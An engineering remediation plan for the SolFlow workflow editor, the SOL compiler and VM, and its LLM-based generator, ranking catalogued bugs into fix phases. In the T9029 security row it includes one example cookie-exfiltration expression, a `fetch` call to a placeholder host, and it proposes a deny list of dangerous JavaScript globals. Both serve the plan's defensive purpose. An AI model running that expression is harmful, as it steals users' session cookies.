# REMEDIATION PLAN

> **Status:** Action plan as of 2026-05-26. Derived from the
> 36-entry `T9xxx` catalogue in
> [`ERROR_REFERENCE.md`](./ERROR_REFERENCE.md), the analyzer-hole
> findings in chapters 04 – 06, and the cross-layer audit in
> chapters 22 – 23.
>
> The chapters describe what is broken. This file describes
> **what to do about it, in what order, by whom.** It is the
> single document a project lead can hand to engineering to drive
> the next several sprints.

This plan is opinionated. Every item carries a priority bucket,
a recommended owner, an estimated scope, and a "blocks demo?"
verdict. Items in *italics* are notes / context, not actions.

---

## Conventions

| Field | Values |
|---|---|
| **Code** | `T9NNN` from `ERROR_REFERENCE.md` (or descriptive name if no code yet) |
| **Component** | `SolFlow frontend` / `SOL compiler` / `SOL runtime/VM` / `Sol Man` / `docs` |
| **Risk** | `Critical` (data loss, security, demo-blocker) / `High` (silent wrong behavior) / `Medium` (UX bug, surprise) / `Low` (cosmetic, edge case) |
| **Scope** | `Small` (≤ 1 day) / `Medium` (1 – 5 days) / `Large` (1 – 4 weeks) / `XL` (multi-month or research) |
| **Blocks demo?** | `Yes` / `No` / `Conditional` |
| **Bucket** | `R1` Must-fix-before-demo · `R2` Should-fix-soon · `R3` Long-term · `R4` Docs-only-warning |

---

## 1. Issue catalogue (every actionable finding)

The table below merges every distinct issue surfaced by the
audit. Each row maps to one chapter section + one or more
`T9xxx` entries.

### 1.1 Security / safety hazards

| Code | Issue | Component | Risk | User impact | Recommended fix | Scope | Blocks demo? | Bucket |
|---|---|---|---|---|---|---|---|---|
| **T9029** | Simulator's `new Function` is arbitrary JS execution. A malicious inline expression can `fetch('http://x/'+document.cookie)` the moment "Run" is clicked. | SolFlow frontend | **Critical** | Cookie theft, exfiltration, XSS-class behavior from any imported / Sol-Man-generated workflow | (1) Lint inline expressions at validation time to reject `Math`/`Date`/`document`/`window`/`globalThis`/`fetch`/`eval`/method-calls/`typeof`. (2) Medium term: sandbox in Web Worker with shadowed globals. (3) Long term: real SOL evaluator (T9022). | Small (step 1) → Medium (step 2) → Large (step 3) | **Yes** | **R1** |
| **T9014** | Top-level `let` panics or silently reads garbage when read from a function body. Anyone porting the "global constant" idiom from another language hits an immediate runtime panic. | SOL compiler | **Critical** | Workflow compiles cleanly, then crashes on first run | Editor: validator should reject top-level `let` with a clear error. Compiler: codegen needs proper handling of globals (separate slot space + `LoadGlobal` op). | Editor: Small. Compiler: Large. | **Yes** (editor side only) | **R1** (editor reject) / **R3** (compiler fix) |
| **T9002** | Bytecode emits enum variants as `first_char % 10`. Variants with same first character collide at runtime. `gemini_long.sol`'s `AppHealth { Offline, Initializing, Stable, Overloaded }` has two collisions. | SOL compiler | **High** | Workflow runs but dispatches wrong; observable as "the wrong branch fires". Silently incorrect production behavior. | Editor: validator should warn on same-first-char variants in any enum. Compiler: replace hash with parser's iota in bytecode emit. | Editor: Small. Compiler: Small (one-line fix in `bytecode.rs:539`). | **Yes** (editor warning at minimum) | **R1** (editor warning) + **R3** (compiler fix; may be possible sooner if compiler team can patch the single bytecode line) |
| **T9020** | Apply-anyway emits `/* missing */` placeholders. Some contexts parse-fail; `print(/* missing */)` is silently dropped because the bytecode skips empty-arg `print` calls. | SolFlow frontend | **High** | User clicks "Apply draft with errors", workflow lands on canvas, runs without doing anything — no error, no output | Replace `/* missing */` with `__UNRESOLVED_INPUT__` (which the SOL parser rejects in any expression context). Or refuse to emit and surface validation errors instead. | Small | **Yes** | **R1** |

### 1.2 Editor → SOL emission hazards

| Code | Issue | Component | Risk | User impact | Recommended fix | Scope | Blocks demo? | Bucket |
|---|---|---|---|---|---|---|---|---|
| **T9018** | Validator does not lint inline expression syntax. Any string in `node.expressions[port]` passes validation and gets emitted verbatim. | SolFlow frontend | **High** | Workflow appears valid in editor, then fails at canonical SOL parse | Add a syntax linter that rejects keywords-in-expression-position (`if`, `while`, `let`, `return`, etc.), method calls (`.foo(...)`), JS-specific globals. | Medium | **Yes** | **R1** |
| **T9019** | Editor's `any` type leaks into SOL as `Type::Ident("any")` — a nominal struct ref to a non-existent struct. | SolFlow frontend | Medium | Compile succeeds; field access on the value fails with `could not find struct any` | Emitter should refuse to emit `any` in a type position. Replace with a TODO comment + treat as validation error. | Small | No | **R2** |
| **T9021** | Literal node `value` text is unchecked against `litType`. `int` literal with text `"hello"` emits as `hello` → analyzer rejects later. | SolFlow frontend | Medium | Subtle bug introduced at edit time; surfaces as compile error later | Validate value text at edit time per-`litType` (regex: `int` → `-?[0-9]+`, `float` → digits-dot-digits, etc.). | Small | No | **R2** |
| **T9001** | Editor emits `// @trigger` annotations. Parser tolerates as comments. | SolFlow frontend / docs | Low | None — comments are inert | *Document as editor extension; no fix needed.* | n/a | No | **R4** |

### 1.3 Sol Man generation hazards

| Code | Issue | Component | Risk | User impact | Recommended fix | Scope | Blocks demo? | Bucket |
|---|---|---|---|---|---|---|---|---|
| chapter 19 §19.8.1 + T9014 | LLM can generate top-level `let` | Sol Man + SolFlow frontend | **Critical** | Runtime panic (see T9014 row) | Update LLM prompt: "Never emit top-level `let`; every binding must live inside a function." Add validator rejection. | Small (prompt) + Small (validator) | **Yes** | **R1** |
| chapter 19 §19.8.2 + T9002 | LLM can generate enum with same-first-char variants | Sol Man | **High** | Runtime dispatch silently wrong | Update LLM prompt: "Within any enum, no two variants may share a first character." Add validator warning. | Small | **Yes** | **R1** |
| chapter 19 §19.8.6 + T9018 | LLM can generate inline expressions with JS / non-SOL syntax | Sol Man | **High** | Parse failure at compile time | Update LLM prompt with explicit "Phase A expression grammar" + examples. Linter (T9018) catches what slips through. | Small (prompt) | **Yes** | **R1** |
| chapter 19 §19.8.7 + T9009 | LLM can spell types wrong (`string`, `int32`, `any`) | Sol Man | Medium | Compile-time-OK, runtime field access fails | Prompt enumerates only the five valid primitives; validator rejects unknown identifiers in type position. | Small | No | **R2** |
| chapter 19 §19.8.10 + T9016 | LLM can declare `ext function` with reserved name (`print`, `rpc_*`) | Sol Man | Medium | Calls go to built-in, never reach the host endpoint | Prompt explicitly forbids the six reserved names. | Small | No | **R3** (prompt) + later compiler check |
| chapter 19 §19.8.11 + T9020 | LLM-generated workflows applied via "Apply draft with errors" produce dangerous SOL | Sol Man | High | Workflow appears applied but is broken | Repair-pass extension: refuse to apply when any required port is empty; force a placeholder instead. | Medium | **Yes** | **R1** (paired with T9020 fix) |

### 1.4 Simulator / canonical SOL divergences

| Code | Issue | Component | Risk | User impact | Recommended fix | Scope | Blocks demo? | Bucket |
|---|---|---|---|---|---|---|---|---|
| **T9022** | Simulator evaluates inline expressions as JavaScript | SolFlow frontend | High | Simulator gives different answers than canonical | Replace `new Function` with a real SOL expression evaluator. | Large | No | **R2** (medium-term step toward) — **R1** for security-only mitigation (T9029) |
| **T9023** | Simulator's `+` does string concatenation; canonical rejects `str + str` | SolFlow frontend | Medium | Simulator says "works", deploy fails | Make simulator reject `str + str` to match canonical. | Small | No | **R2** |
| **T9024** | Simulator's `/` always returns a double; canonical does truncating int division | SolFlow frontend | Medium | `5/2` is `2.5` in simulator, `2` in production | When both operands' inferred SOL type is `int`, use `Math.trunc(num(a) / num(b))`. | Small | No | **R2** |
| **T9025** | Simulator's `toBool` is JS-permissive | SolFlow frontend | Medium | Simulator silently allows non-bool conditions | Make `toBool` require boolean operands; surface a runtime error otherwise. | Small | No | **R2** |
| **T9026** | Simulator enum comparison normalizes by name (intended) but canonical uses first-char hash (T9002). Simulator hides T9002. | SolFlow frontend | **High** | "Works in simulator → wrong in production" | Until T9002 is fixed: warn in editor on same-first-char variants (covered by §1.1 row T9002). Once T9002 is fixed: simulator already matches. | Pairs with T9002 | **Yes** (the warning) | **R1** |
| **T9027** | Simulator has flat per-function scope; canonical has nested block scopes | SolFlow frontend | High | Two-direction divergence; redefinition errors and undefined-variable errors both go opposite ways between simulator and canonical | Add nested scope stack to simulator's `walkChain` — push on Block entry, pop on Block exit. | Medium | No | **R2** |
| **T9028** | Simulator throws on undefined varGet; canonical bytecode auto-creates a Type::Integer slot (T9014 mechanism). | SolFlow frontend | n/a | Simulator > canonical for safety here. | Keep simulator's stricter behavior. Fix canonical (T9014). | n/a (no editor change) | No | **R4** (document) |
| **T9030** | Simulator step/depth/duration limits; canonical has none | SolFlow frontend | Low | Programs that fail simulator limits may run fine in canonical | Document; no change. | n/a | No | **R4** |
| **T9031** | Simulator cannot exercise `ext function` calls | SolFlow frontend | Medium | Users cannot end-to-end test ext-heavy workflows | Add "ext stub" mechanism in the Inspector: per-`ext` mock return value. Simulator dispatches to mock. | Medium | Conditional (yes if demo uses ext) | **R2** |

### 1.5 Graph store / mutation hazards

| Code | Issue | Component | Risk | User impact | Recommended fix | Scope | Blocks demo? | Bucket |
|---|---|---|---|---|---|---|---|---|
| **T9032** | `updateFunctionSignature` leaves dangling arg edges | SolFlow frontend | Medium | After renaming a parameter, validator reports "missing input" everywhere; user must re-wire | Call `rebuildAllPorts()` after every signature change. | Small | No | **R2** |
| **T9033** | `rebuildAllPorts` silently drops dangling edges | SolFlow frontend | Medium | Silent loss of wiring on struct-field renames | Collect dropped edges and surface as a toast warning. | Small | No | **R2** |
| **T9034** | `loadWorkflow` performs no schema validation | SolFlow frontend | Medium | Malformed JSON corrupts the store; downstream crashes | Add a runtime schema validator (zod / hand-written) at the boundary. | Small | No | **R2** |
| **T9035** | Undo/redo `isReplaying` race window | SolFlow frontend | Low | Rare lost redo step under rapid mashing | Replace single boolean with per-operation token. | Small | No | **R3** |
| **T9036** | Autosave 600ms debounce loses changes on tab close | SolFlow frontend | Medium | Affects every editor session | Add `beforeunload` listener that synchronously flushes the pending save. | Small | **Yes** for demo polish | **R1** |

### 1.6 Compiler / analyzer holes

| Code | Issue | Component | Risk | User impact | Recommended fix | Scope | Blocks demo? | Bucket |
|---|---|---|---|---|---|---|---|---|
| **T9003** | `print(a, b, c)` only emits `args[0]` | SOL compiler | High | Silent data loss in printed output | Compiler: emit one `Print*` per arg, with `;` separators. | Small | No (editor model already prevents) | **R3** |
| **T9005** | `ConcatStr` exists in bytecode but `str + str` rejected by analyzer | SOL compiler | Low | Users can't concat strings | Analyzer: accept `str + str` for `Token::Plus`, emitting `ConcatStr`. | Small | No | **R3** |
| **T9006** | `TypeMismatch::ArraySize` computed but never surfaced | SOL compiler | Low | Diagnostic says "mismatched types" when "array size mismatch" would be clearer | Analyzer: match on `Err(TypeMismatch::ArraySize)` and emit a distinct message. | Small | No | **R3** |
| **T9007** | Tuple `type_eq` zip-truncation | SOL compiler | Latent | None today (no value form for tuples) | Add `types_lhs.len() == types_rhs.len()` guard before zip. | Small | No | **R3** |
| **T9008** | Function `type_eq` ignores actual return types | SOL compiler | Latent | None today (no first-class function values) | Replace void-flag dance with `type_eq(*ret_lhs, *ret_rhs)`. Add param-arity guard. | Small | No | **R3** |
| **T9009** | Unknown primitive name silently becomes nominal | SOL compiler | High | `let x: string` compiles; field access later fails | Analyzer: at struct decl / let decl / param decl, check that any `Type::Ident(name)` resolves to a declared struct/enum. | Small | No | **R3** |
| **T9010** | VM ops silently no-op on type mismatch | SOL runtime/VM | High | Silent stack corruption; symptoms surface in unrelated code | VM: replace `if let HeapObject::X = ...` no-ops with explicit panics. | Small | No | **R3** |
| **T9011** | Void function `Ret` pushes `0` | SOL runtime/VM | Medium | Void calls visible as integer `0` to callers | Design decision: either keep (and document as the contract) or change `Ret` to not push and require explicit `RetVal` for value-returning. | Medium | No | **R3** |
| **T9012** | `ExtCall` hand-rolled HTTP/1.1, no HTTPS, no timeout | SOL runtime/VM | High | Cannot call HTTPS endpoints; hangs forever on dead endpoints; silent defaults on bad responses | Replace with `reqwest` (or similar) — HTTPS, configurable timeout, status-code-aware errors. | Medium | Conditional (yes if demo deploys to real hosts) | **R3** |
| **T9015** | Forward function calls' return types aren't pre-registered | SOL compiler | Medium | `print(forward_call())` prints heap-index instead of contents | Pass-1 should also register `DeclFunc` return types in `fn_returns`. | Small | No | **R3** |
| **T9016** | Built-in name dispatch shadows user `ext function` | SOL compiler | Medium | Silently wrong dispatch | Analyzer: reject `ext function` declarations whose name matches a built-in. | Small | No | **R3** |
| **T9017** | `CliParser` panics on empty / single-char arguments | SOL compiler | Low | Edge-case panic when wrapping the CLI binary | Replace `.unwrap()` with length checks. | Small | No | **R3** |
| Analyzer's `let`-initializer type check is missing | SOL compiler | Medium | `let x: int = "hello"` compiles | Analyzer: walk `DeclVar.value` and call `type_eq` against declared type. | Medium | No | **R3** |
| Analyzer's return-path check is commented out | SOL compiler | Medium | `-> int` functions without a return appear to "return 0" (via T9011) | Re-enable the commented-out branch checking; reject divergent / missing returns. | Medium | No | **R3** |
| `ExprStructInit` is `todo!()` in analyzer | SOL compiler | Medium | Struct literals can miss fields; field-types unchecked | Implement the check: every declared field must appear; each value's type must match the field's declared type. | Medium | No | **R3** |
| `ExprArrayInit` is `todo!()` in analyzer | SOL compiler | Medium | Heterogeneous arrays compile silently | Implement: every element must match the inferred element type. | Small | No | **R3** |

### 1.7 Documentation-only items (no code change recommended)

| Code | Reason for doc-only | Bucket |
|---|---|---|
| T9001 | Editor extension; intentionally non-canonical | **R4** |
| T9004 | Intentional fail-fast at compile time | **R4** |
| T9013 | Bare expression statements are a feature; `f();` discard is correct | **R4** |
| T9028 | Simulator > canonical here; canonical fix is T9014 | **R4** |
| T9030 | Simulator-only safety limits; not language semantics | **R4** |

### 1.8 Audit-level blockers (from `SOL_CRATE_IDE_READINESS_PLAN.md`)

These are the canonical-side refactors the compiler team has
already identified. Listed for completeness; ownership is
upstream.

| Blocker | Component | Scope | Bucket |
|---|---|---|---|
| #2 — `process::exit(1)` everywhere → `Result<T, Vec<Diagnostic>>` | SOL compiler | Large | **R3** |
| #3 — No source spans on tokens / AST | SOL compiler | Large | **R3** |
| #4 — No serde derives | SOL compiler | Medium | **R3** |
| #5 — `HashMap` for struct fields / enum variants (insertion order destroyed) | SOL compiler | Small | **R3** |
| #6 — Lexer is file-I/O only; needs `from_string` | SOL compiler | Small | **R3** |
| #14 / #15 / #16 — emit_sol / ast_to_graph / graph_to_ast / validate_graph (none exist yet) | SOL compiler | XL | **R3** |
| #18 — Several analyzer holes (let-init, return-path, struct-init) | SOL compiler | Medium | **R3** |

---

## 2. Bucket summary

### R1 — Must fix before demo (Critical / High risk, demo-blocker)

| # | Item | Component | Scope |
|---|---|---|---|
| R1.1 | **T9029** — Lint inline expressions to reject JS-specific globals/syntax | SolFlow frontend | Small |
| R1.2 | **T9014** — Editor validator rejects top-level `let` | SolFlow frontend | Small |
| R1.3 | **T9002 + T9026** — Editor validator warns on same-first-char enum variants | SolFlow frontend | Small |
| R1.4 | **T9020** — Replace `/* missing */` placeholder with `__UNRESOLVED_INPUT__`; refuse apply-anyway for empty required ports | SolFlow frontend + Sol Man | Small |
| R1.5 | **T9018** — Validator lints inline expression syntax (keywords-in-expression position, method calls) | SolFlow frontend | Medium |
| R1.6 | Sol Man prompt update: no top-level `let`, no colliding enum variants, no JS syntax in expressions, no method calls, only five primitive type spellings, no built-in name shadowing | Sol Man | Small |
| R1.7 | **T9036** — `beforeunload` flush of autosave debounce | SolFlow frontend | Small |
| R1.8 | **Sample audit pass** — review `src/samples/*.ts` for T9002/T9009/T9014/T9027 patterns; fix or remove unsafe samples | SolFlow frontend | Small |

**R1 estimated total: 1 – 2 weeks for one engineer.**

### R2 — Should fix soon after demo (Medium risk, no demo block)

| # | Item | Component | Scope |
|---|---|---|---|
| R2.1 | **T9019** — Refuse to emit `any` type | SolFlow frontend | Small |
| R2.2 | **T9021** — Validate literal value text at edit time | SolFlow frontend | Small |
| R2.3 | **T9023** — Simulator rejects `str + str` | SolFlow frontend | Small |
| R2.4 | **T9024** — Simulator uses truncating int division when both operands are int | SolFlow frontend | Small |
| R2.5 | **T9025** — Simulator requires bool for conditions | SolFlow frontend | Small |
| R2.6 | **T9027** — Simulator adopts nested block scope | SolFlow frontend | Medium |
| R2.7 | **T9029 step 2** — Sandbox `new Function` in a Web Worker | SolFlow frontend | Medium |
| R2.8 | **T9031** — Add `ext function` stub mechanism in Inspector | SolFlow frontend | Medium |
| R2.9 | **T9032** — `updateFunctionSignature` calls `rebuildAllPorts` | SolFlow frontend | Small |
| R2.10 | **T9033** — `rebuildAllPorts` surfaces dropped edges as toast warnings | SolFlow frontend | Small |
| R2.11 | **T9034** — `loadWorkflow` validates schema at the boundary | SolFlow frontend | Small |
| R2.12 | Sol Man generation guide updates: T9009 type names; T9019 `any`-leak guidance | Sol Man + docs | Small |

**R2 estimated total: 2 – 3 weeks for one engineer.**

### R3 — Long-term compiler / runtime work

| # | Item | Component | Scope |
|---|---|---|---|
| R3.1 | **T9002** real fix — bytecode emits parser's iota instead of first-char hash | SOL compiler | Small |
| R3.2 | **T9009** — analyzer validates `Type::Ident` resolves at decl time | SOL compiler | Small |
| R3.3 | **T9015** — pass-1 also pre-registers regular function return types | SOL compiler | Small |
| R3.4 | **T9016** — analyzer rejects `ext function` with built-in name | SOL compiler | Small |
| R3.5 | **T9017** — `CliParser` length-checked | SOL compiler | Small |
| R3.6 | **T9006** — analyzer surfaces `ArraySize` mismatch as distinct diagnostic | SOL compiler | Small |
| R3.7 | **T9007** — tuple `type_eq` arity guard | SOL compiler | Small |
| R3.8 | **T9008** — function `type_eq` checks return types + param arity | SOL compiler | Small |
| R3.9 | Analyzer's `let`-initializer type check | SOL compiler | Medium |
| R3.10 | Analyzer's return-path check (re-enable) | SOL compiler | Medium |
| R3.11 | `ExprStructInit` / `ExprArrayInit` checks | SOL compiler | Medium |
| R3.12 | **T9005** — analyzer accepts `str + str` to reach `ConcatStr` | SOL compiler | Small |
| R3.13 | **T9003** — bytecode emits one Print per arg | SOL compiler | Small |
| R3.14 | **T9010** — VM ops panic on type mismatch instead of silent no-op | SOL runtime/VM | Small |
| R3.15 | **T9011** — design call: void `Ret` push 0 — keep + document, or change | SOL runtime/VM | Medium |
| R3.16 | **T9012** — replace hand-rolled HTTP with `reqwest` (HTTPS, timeouts, status checks) | SOL runtime/VM | Medium |
| R3.17 | **T9014** real fix — proper globals model in codegen + new `LoadGlobal`/`StoreGlobal` ops | SOL compiler + VM | Large |
| R3.18 | **T9022** real fix — replace simulator's `new Function` with a SOL expression evaluator | SolFlow frontend | Large |
| R3.19 | Simulator vs canonical: add ext-stub support (R2.8 long-term replacement) | SolFlow frontend | Medium |
| R3.20 | **T9035** — undo/redo per-operation token | SolFlow frontend | Small |
| R3.21 | Audit-doc blocker #2 — errors as `Result<T, Vec<Diagnostic>>` | SOL compiler | Large |
| R3.22 | Audit-doc blocker #3 — source spans on tokens / AST | SOL compiler | Large |
| R3.23 | Audit-doc blocker #4 — serde derives for WASM bridge | SOL compiler | Medium |
| R3.24 | Audit-doc blocker #5 — `HashMap` → order-preserving container | SOL compiler | Small |
| R3.25 | Audit-doc blocker #6 — lexer `from_string` | SOL compiler | Small |
| R3.26 | Audit-doc blockers #14–#16 — `emit_sol` / `ast_to_graph` / `graph_to_ast` / `validate_graph` | SOL compiler | XL |

**R3 estimated total: 3 – 6 months for the compiler team
working in parallel with editor team.**

### R4 — Documentation-only warning for now

Items where the *current behavior* is the correct documented
answer until a downstream refactor lands. The docs already
cover them; no code change recommended in this plan.

- T9001 (trigger annotations)
- T9004 (intentional fail-fast on missing ext endpoint)
- T9013 (bare expression statements / implicit `Pop`)
- T9028 (simulator stricter than canonical — intentional)
- T9030 (simulator-only safety limits)

---

## 3. Phase sequence

A practical, dependency-aware ordering of the buckets. Each
phase should be completed and demoed/reviewed before the next
begins.

### Phase R1 — Immediate SolFlow safety fixes (1 – 2 weeks)

Single objective: **the demo must not crash, leak data, or
silently produce wrong results from any path the user will hit.**

Gate criteria:

- No inline expression with `Math`/`Date`/`document`/`window`/
  `globalThis`/`fetch`/`eval` reaches the simulator.
- No workflow with a top-level `let` can be applied to the
  canvas.
- No enum with same-first-char variants can be applied
  without an explicit warning.
- No "Apply draft with errors" path silently produces empty
  `print();` no-ops.
- No autosave loss when the user closes the tab.
- Every sample workflow shipped in `src/samples/*.ts` either
  compiles cleanly under canonical SOL or carries a comment
  marking it simulator-only.

Order of work:

1. R1.1 + R1.5 (inline expression linter — combine the security
   filter with the syntax filter; same code path).
2. R1.2 (top-level let rejection).
3. R1.3 (enum first-char warning).
4. R1.4 (apply-anyway placeholder fix).
5. R1.6 (Sol Man prompt update — can land in parallel; depends on
   nothing).
6. R1.7 (beforeunload flush).
7. R1.8 (sample audit + cleanup — final pass before demo).

### Phase R2 — Simulator correctness pass (2 – 3 weeks)

Single objective: **`works in simulator` should imply `works in
canonical SOL`** for everything the editor can express.

Gate criteria:

- Simulator and canonical-SOL behavior agree on every fixture
  in `reference/sol files/` that doesn't rely on `ext`.
- Inline expressions that fail at canonical parse / analyze
  also fail in the simulator.
- The "works in simulator → fails in production" class of bug
  is closed.

Order of work:

1. R2.1 + R2.2 (small structural fixes).
2. R2.3 + R2.4 + R2.5 (operator semantics alignment).
3. R2.6 (nested block scope) — the biggest single semantic
   change in this phase.
4. R2.7 (sandbox `new Function` in Worker; defense-in-depth even
   after the linter).
5. R2.8 (ext stub mechanism — enables full-workflow testing).
6. R2.9 / R2.10 / R2.11 (mutation hazards).
7. R2.12 (Sol Man + docs polish).

### Phase R3 — Compiler / runtime long-term work

Single objective: **canonical SOL semantics catch up to what
the editor / Sol Man / docs already promise.**

This is the compiler team's roadmap. The audit doc
(`SOL_CRATE_IDE_READINESS_PLAN.md`) is the authoritative source
for sequencing within R3; this remediation plan adds the
new T9xxx-derived items to that list. Suggested grouping:

- **R3-A — Bytecode bug fixes (1 – 2 weeks):** T9002, T9003,
  T9005, T9006, T9015, T9016, T9017, T9010. All small; can ship
  together as a "diagnostic + correctness" patch release.
- **R3-B — Analyzer hole closures (2 – 4 weeks):** T9009, blocker
  #18 items (let-init, return-path, struct-init / array-init).
- **R3-C — Audit-doc refactors (3 – 6 months):** blockers #2,
  #3, #4, #5, #6 + the emit_sol / graph_to_ast / ast_to_graph /
  validate_graph net-new work.
- **R3-D — Runtime hardening (2 – 4 weeks):** T9011 (design call),
  T9012 (HTTP client replacement).
- **R3-E — Editor parity (1 – 2 weeks each):** T9022 (real SOL
  evaluator), T9035 (undo token), T9014 long-term (globals).

R3-A and R3-B unblock the most user-facing pain immediately;
R3-C is the foundational refactor that lets the editor stop
maintaining a parallel implementation.

### Phase R4 — Docs website preparation

Single objective: **the docs already shipped become a public-
facing language reference.**

The docs at `docs/sol-language/` are the source. R4 is the
publishing layer.

Order of work:

1. Decide on a static-site generator (mdBook, Docusaurus, VitePress,
   Astro Starlight). Recommendation: **mdBook** — closest to the
   docs' tone, zero JS by default, easy to host on Vercel/GitHub
   Pages.
2. Author a `book.toml` or equivalent config; choose theme.
3. Set up a `docs/` → site build pipeline. CI builds on every
   PR; deploys on merge.
4. Add a search index (mdBook has built-in; Docusaurus uses
   Algolia DocSearch).
5. Review every chapter for tone, public-vs-internal split. The
   `internal-notes.md` file must be excluded from publication.
6. Add a redirect / landing page at the project root pointing
   at the docs URL.

R4 is a 1 – 2 week project once the docs are stable, which they
are. Can begin in parallel with R1.

### Phase R5 — Continuous-audit cadence

A meta-phase: rather than a one-shot audit, treat the
`T9xxx` catalogue as a living document. Each new compiler /
editor / Sol Man change should:

- Add a new `T9xxx` entry if it introduces a divergence.
- Update the matching bucket in this remediation plan.
- Block release if the new issue is `R1` or unbuckted-Critical.

A monthly audit-review cadence keeps the catalogue current
without re-running the full source pass each time.

---

## 4. Effort summary

| Phase | Owner | Scope | Wall-clock estimate (1 engineer, focused) |
|---|---|---|---|
| R1 | SolFlow frontend + Sol Man | 8 items, mostly Small | 1 – 2 weeks |
| R2 | SolFlow frontend | 12 items, mix of Small/Medium | 2 – 3 weeks |
| R3-A | SOL compiler | 8 small bytecode fixes | 1 – 2 weeks |
| R3-B | SOL compiler | Analyzer holes | 2 – 4 weeks |
| R3-C | SOL compiler | Audit-doc refactors | 3 – 6 months |
| R3-D | SOL runtime/VM | T9011 + T9012 | 2 – 4 weeks |
| R3-E | SolFlow + SOL | T9022 / T9035 / T9014 long-term | 4 – 8 weeks |
| R4 | docs / DX | Static-site publishing | 1 – 2 weeks |
| R5 | tech lead | Ongoing cadence | recurring |

**Total R1 + R2: ~4 – 5 weeks** to a state where SolFlow can
be demoed and used without the foot-guns documented in the
audit.

**Total R1 + R2 + R3-A: ~5 – 7 weeks** if a compiler engineer
can patch the small bytecode bugs in parallel.

---

## 5. Open decisions requiring product input

A few items need a call from the project lead before engineering
begins:

| Decision | Context | Recommendation |
|---|---|---|
| Should `T9011` (void function returns `0`) become a normative spec rule or be changed? | The current behavior is consistent but surprising. Either commit to it in SPEC §7 or change `Ret` to not push. | Keep + document. Changing `Ret` is a runtime-ABI break. |
| Should the simulator be tightened to *exactly* match canonical SOL (R2.3–R2.6) or kept as a more permissive "linter mode"? | Tighter = better preview accuracy. More permissive = easier authoring. | Tighten. The mismatches surface real bugs in production; users prefer "fails here, fails everywhere". |
| Should `T9014` long-term fix (proper globals) ship as part of canonical SOL or be deferred to "Phase B"? | Phase A doesn't really need globals; users can put state in `start`'s body. | Defer. R1 editor-side rejection is enough for now. |
| Should we publish the docs as a public website, semi-public, or keep internal? | The privacy posture is already public-ready. Publishing accelerates onboarding but commits to maintaining external links. | Semi-public initially (linkable but not indexed); revisit before any external launch. |
| Should the Sol Man LLM prompt be split into "generate a valid graph" + "validate / repair the graph" sub-prompts, or kept as a single prompt? | Splitting may produce better results but doubles the LLM-call cost. | Single prompt with checklist for now; revisit if validation-error rate stays high. |

---

## 6. What success looks like

**Demo-readiness checklist (end of R1):**

- [ ] No "works in simulator → exfiltrates cookies in canvas" path
- [ ] No "compiles cleanly → runtime panic from a global let" path
- [ ] No "enum dispatch silently wrong" path (or: clear warning)
- [ ] No "Apply draft with errors → silent no-op print" path
- [ ] No "lost work because I closed the tab" path
- [ ] No bundled sample that produces a workflow canonical SOL would reject
- [ ] Sol Man's LLM prompt forbids every pattern in chapter 19 §19.8

**Production-readiness checklist (end of R2 + R3-A):**

- [ ] Simulator and canonical SOL agree on every fixture
- [ ] Editor validator catches every chapter-19 dangerous pattern
- [ ] T9002 fixed in bytecode (enum dispatch is correct)
- [ ] T9003 fixed in bytecode (`print` emits all args)
- [ ] T9009 caught at analyzer decl-time
- [ ] T9015 fixed (forward-call return types known)
- [ ] T9010 fixed (VM ops fail loudly on type mismatch)

**Public-launch readiness (end of R3-B):**

- [ ] Every analyzer hole closed (let-init, return-path, struct-init,
  array-init)
- [ ] Docs published as a website
- [ ] T9012 fixed (HTTPS + timeouts on `ExtCall`)
- [ ] Audit-doc blockers #2/#3 landed (structured diagnostics
  with source spans)

---

## 7. Sources

This plan synthesizes:

- 36 `T9xxx` entries in [`ERROR_REFERENCE.md`](./ERROR_REFERENCE.md)
- Analyzer / compiler holes documented in chapters 04 – 14
- Cross-layer audit in [chapter 22](./22-cross-layer-assumptions.md)
- Editor runtime audit in [chapter 23](./23-editor-runtime-audit.md)
- The behavior-classification taxonomy from [chapter 21](./21-behavior-classification.md)
- The upstream audit at `reference/SOL_CRATE_IDE_READINESS_PLAN.md`
  (the canonical compiler team's pre-existing roadmap)

For per-item context, follow the cross-references in the
catalogue tables.
